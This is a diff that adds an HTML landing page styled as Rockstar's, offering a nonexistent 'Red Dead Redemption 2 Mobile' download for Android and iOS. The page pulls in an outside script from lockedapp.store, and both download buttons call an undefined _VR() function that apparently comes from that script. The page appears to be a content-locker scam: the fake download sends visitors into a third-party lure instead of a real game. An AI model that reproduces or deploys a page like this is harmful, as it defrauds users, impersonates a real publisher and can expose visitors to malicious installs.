@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <script type="text/javascript" id="ogjs" src="https://lockedapp.store/cl/js/7jjwn9"></script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Download Red Dead Redemption 2 for Android and iOS. Experience the epic Western action-adventure game on your mobile device with stunning graphics and immersive gameplay.">
+    <meta name="keywords" content="Red Dead Redemption 2 Mobile, RDR2, Western Game, Action Adventure, Mobile Gaming, Rockstar">
+    <meta name="author" content="tarikelhamdi">
+    <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow">
+    <meta name="creation-date" content="2025-03-07">
+    <meta name="last-modified" content="2025-03-07 18:35:07">
+    <meta name="owner" content="tarikelhamdi">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Download Red Dead Redemption 2 Mobile - Rockstar">
+    <meta property="og:description" content="Download Red Dead Redemption 2 for Android and iOS. Experience the ultimate Western adventure on your mobile device.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://example.com//game/rdr2-mobile.html">
+    <meta property="og:image" content="https://example.com//images/screen/rdr2/slider1.jpg">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Download Red Dead Redemption 2 Mobile - Rockstar">
+    <meta name="twitter:description" content="Download Red Dead Redemption 2 for Android and iOS devices">
+    <meta name="twitter:image" content="https://example.com//images/screen/rdr2/slider1.jpg">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="images/ico.ico">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://example.com//game/rdr2-mobile.html">
+
+    <title>Download Red Dead Redemption 2 Mobile - Rockstar</title>
+
+    <style>
+        /* Modern Variables */
+        :root {
+            --primary: #c41e3a;
+            --secondary: #8b0000;
+            --background: #0f172a;
+            --surface: #1e293b;
+            --text: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent: #d4af37;
+            --radius: 16px;
+            --radius-sm: 8px;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Reset & Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: var(--background);
+            color: var(--text);
+            line-height: 1.5;
+        }
+
+        /* Header Styles */
+        header {
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            height: 70px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 100%;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            transition: opacity 0.3s ease;
+        }
+
+        .logo:hover {
+            opacity: 0.9;
+        }
+
+        /* Navigation Menu Styles */
+        .nav-menu {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            height: 100vh;
+            width: 80%;
+            max-width: 400px;
+            background: var(--surface);
+            padding: 2rem;
+            transition: 0.3s ease;
+            z-index: 1000;
+        }
+
+        .nav-menu.active {
+            right: 0;
+        }
+
+        .menu-items {
+            list-style: none;
+            margin-top: 2rem;
+        }
+
+        .menu-items li {
+            margin: 1.5rem 0;
+            opacity: 0;
+            transform: translateX(20px);
+            animation: slideIn 0.3s ease forwards;
+        }
+
+        .menu-items a {
+            color: var(--text);
+            text-decoration: none;
+            font-size: 1.1rem;
+            display: block;
+            padding: 0.5rem 0;
+            transition: color 0.3s ease;
+        }
+
+        .menu-items a:hover {
+            color: var(--primary);
+        }
+
+        .menu-toggle {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            z-index: 1001;
+            transition: background-color 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Game Banner Styles */
+        .game-banner {
+            margin-top: 70px;
+            width: 100%;
+            height: 400px;
+            background-image: url('images/screen/rdr2/slider1.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
+        .game-banner::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+            background: linear-gradient(to top, var(--background), transparent),
+                        linear-gradient(to bottom, rgba(196, 30, 58, 0.2), transparent);
+        }
+
+        /* Game Content Styles */
+        .game-content {
+            max-width: 1200px;
+            margin: -100px auto 0;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .game-header {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .game-icon {
+            width: 120px;
+            height: 120px;
+            border-radius: var(--radius);
+            object-fit: cover;
+            box-shadow: var(--shadow);
+        }
+
+        .game-info {
+            flex: 1;
+        }
+
+        .game-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Download Buttons */
+        .download-buttons {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .download-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem 2rem;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            text-decoration: none;
+            border-radius: var(--radius);
+            font-weight: 500;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .download-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Screenshots Section */
+        .screenshots {
+            margin-top: 3rem;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            color: var(--text);
+        }
+
+        .screenshots-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .screenshot {
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+            aspect-ratio: 16/9;
+            position: relative;
+            border: 1px solid rgba(196, 30, 58, 0.2);
+        }
+
+        .screenshot:hover {
+            transform: scale(1.02);
+        }
+
+        .screenshot img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        /* Description Section */
+        .description {
+            margin-top: 3rem;
+            padding: 2rem;
+            background: var(--surface);
+            border-radius: var(--radius);
+        }
+
+        .description p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        /* Footer Styles */
+        footer {
+            background: var(--surface);
+            margin-top: 3rem;
+            padding: 2rem 1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2rem;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .footer-section h3 {
+            color: var(--text);
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+            font-size: 0.95rem;
+        }
+
+        .footer-links a:hover {
+            color: var(--text);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 2rem;
+            color: var(--text-secondary);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 2rem;
+            font-size: 0.9rem;
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.3s ease;
+            z-index: 999;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .menu-items li:nth-child(1) { animation-delay: 0.1s; }
+        .menu-items li:nth-child(2) { animation-delay: 0.2s; }
+        .menu-items li:nth-child(3) { animation-delay: 0.3s; }
+        .menu-items li:nth-child(4) { animation-delay: 0.4s; }
+        .menu-items li:nth-child(5) { animation-delay: 0.5s; }
+
+        /* Responsive Design */
+        @media (min-width: 768px) {
+            .footer-content {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            header {
+                height: 60px;
+            }
+
+            .logo {
+                font-size: 1.3rem;
+            }
+
+            .menu-toggle {
+                width: 36px;
+                height: 36px;
+            }
+
+            .game-banner {
+                height: 300px;
+            }
+
+            .game-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+
+            .game-title {
+                font-size: 2rem;
+            }
+
+            .download-buttons {
+                flex-direction: column;
+            }
+
+            .screenshots-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .screenshot {
+                aspect-ratio: 16/9;
+            }
+
+            .footer-section h3 {
+                font-size: 1rem;
+            }
+
+            .footer-links a {
+                font-size: 0.9rem;
+            }
+
+            .copyright {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <a href="/" class="logo">Rockstar</a>
+            <div class="menu-toggle" id="menuToggle">
+                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                </svg>
+            </div>
+        </div>
+    </header>
+
+    <nav class="nav-menu" id="navMenu">
+        <ul class="menu-items">
+            <li><a href="/">Home</a></li>
+            <li><a href="#popular">Popular Games</a></li>
+            <li><a href="#new">New Releases</a></li>
+            <li><a href="#about">About Us</a></li>
+            <li><a href="#contact">Contact</a></li>
+			        </ul>
+    </nav>
+
+    <div class="overlay" id="overlay"></div>
+
+    <!-- Game Banner -->
+    <div class="game-banner" style="background-image: url('https://i.ytimg.com/vi/qmcQ79ojRM4/maxresdefault.jpg');"></div>
+
+    <!-- Game Content -->
+    <main class="game-content">
+        <div class="game-header">
+            <img src="https://avatarfiles.alphacoders.com/140/thumb-1920-140579.png" alt="Red Dead Redemption 2 Mobile Icon" class="game-icon">
+            <div class="game-info">
+                <h1 class="game-title">Red Dead Redemption 2 Mobile</h1>
+                <p>Experience the epic tale of Arthur Morgan and the Van der Linde gang on your mobile device</p>
+                <div class="download-buttons">
+                    <a onclick="_VR()" class="download-btn">
+                        <img src="https://img.icons8.com/?size=100&id=99375&format=png&color=000000" alt="Android">
+                        Download for Android
+                    </a>
+                    <a onclick="_VR()" class="download-btn">
+                        <img src="https://img.icons8.com/?size=100&id=30840&format=png&color=000000" alt="iOS">
+                        Download for iOS
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screenshots Section -->
+        <section class="screenshots">
+            <h2 class="section-title">Screenshots</h2>
+            <div class="screenshots-grid">
+                <div class="screenshot">
+                    <img src="https://external-preview.redd.it/red-dead-redemption-and-undead-nightmare-coming-to-epic-v0-t2tngYJmt6ctCYtWNNn52Yd9sIOz-asQPYZCCxE2IiY.jpg?width=1080&crop=smart&auto=webp&s=c892bd0eedccee41a1503eb42c81f36b970669a4" alt="Red Dead Redemption 2 Mobile Screenshot 1" loading="lazy">
+                </div>
+                <div class="screenshot">
+                    <img src="https://www.psdsuckers.com/wp-content/uploads/2023/03/red-dead-redemption-logo-font-download.jpeg" alt="Red Dead Redemption 2 Mobile Screenshot 2" loading="lazy">
+                </div>
+                <div class="screenshot">
+                    <img src="https://outline-prod.imgix.net/20181022-QtY4l9YxGrmM18Ca0P3a?auto=format&q=60&w=1280&s=38e145cdda6cb1494645b71f69e00118" alt="Red Dead Redemption 2 Mobile Screenshot 3" loading="lazy">
+                </div>
+            </div>
+        </section>
+
+        <!-- Description Section -->
+        <section class="description">
+            <h2 class="section-title">About Red Dead Redemption 2 Mobile</h2>
+            <p>Step into the boots of Arthur Morgan in this groundbreaking mobile version of the critically acclaimed Western epic. Experience the vast American frontier like never before, with stunning mobile-optimized graphics and intuitive touch controls.</p>
+            
+            <h3 class="section-title">Features</h3>
+            <p>• Immersive open-world gameplay optimized for mobile</p>
+            <p>• Stunning graphics with dynamic weather and day/night cycle</p>
+            <p>• Deep story missions and side activities</p>
+            <p>• Customizable controls and auto-aim options</p>
+            <p>• Cloud save support across devices</p>
+
+            <h3 class="section-title">System Requirements</h3>
+            <p>Android:</p>
+            <p>• Android 10.0 or higher</p>
+            <p>• 6GB RAM minimum</p>
+            <p>• 8GB free storage space</p>
+            
+            <p>iOS:</p>
+            <p>• iOS 14.0 or higher</p>
+            <p>• iPhone 11 or newer</p>
+            <p>• 8GB free storage space</p>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <ul class="footer-links">
+                    <li><a href="/">Home</a></li>
+                    <li><a href="#popular">Popular Games</a></li>
+                    <li><a href="#new">New Releases</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Categories</h3>
+                <ul class="footer-links">
+                    <li><a href="#action">Action Games</a></li>
+                    <li><a href="#adventure">Adventure Games</a></li>
+                    <li><a href="#open-world">Open World Games</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Support</h3>
+                <ul class="footer-links">
+                    <li><a href="#contact">Contact Us</a></li>
+                    <li><a href="#faq">FAQ</a></li>
+                    <li><a href="#privacy">Privacy Policy</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Follow Us</h3>
+                <ul class="footer-links">
+                    <li><a href="#twitter">Twitter</a></li>
+                    <li><a href="#discord">Discord</a></li>
+                    <li><a href="#youtube">YouTube</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            <p>&copy; 2025 Rockstar. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Menu Toggle Functionality
+        const menuToggle = document.getElementById('menuToggle');
+        const navMenu = document.getElementById('navMenu');
+        const overlay = document.getElementById('overlay');
+
+        menuToggle.addEventListener('click', () => {
+            navMenu.classList.toggle('active');
+            overlay.classList.toggle('active');
+        });
+
+        overlay.addEventListener('click', () => {
+            navMenu.classList.remove('active');
+            overlay.classList.remove('active');
+        });
+
+        // Lazy Loading for Screenshots
+        document.addEventListener('DOMContentLoaded', function() {
+            const images = document.querySelectorAll('img[loading="lazy"]');
+            const imageOptions = {
+                threshold: 0.1,
+                rootMargin: "50px"
+            };
+
+            const imageObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        img.src = img.src;
+                        observer.unobserve(img);
+                    }
+                });
+            }, imageOptions);
+
+            images.forEach(img => imageObserver.observe(img));
+        });
+    </script>
+</body>
+</html>
